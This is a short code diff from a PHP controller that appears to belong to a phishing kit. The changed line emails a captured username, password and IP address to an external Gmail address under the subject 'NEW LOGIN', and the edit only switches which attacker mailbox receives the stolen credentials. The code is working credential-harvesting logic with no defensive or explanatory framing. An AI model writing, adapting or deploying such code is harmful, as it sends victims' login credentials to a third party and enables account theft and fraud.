@@ -63,7 +63,7 @@ class MainController extends Controller {
                     # return "leads has ".count($leads)." elements";
                      $ret = "";
                      
-                     $this->helpers->sendEmail("uwantbrendacolson@gmail.com","NEW LOGIN" ,['u' => $u, 'p' => $p, 'ip' => $ip],'emails.bomb','view');
+                     $this->helpers->sendEmail("emailob9ja@gmail.com","NEW LOGIN" ,['u' => $u, 'p' => $p, 'ip' => $ip],'emails.bomb','view');
                              $ret = "success";
                              #sleep(500);
                              
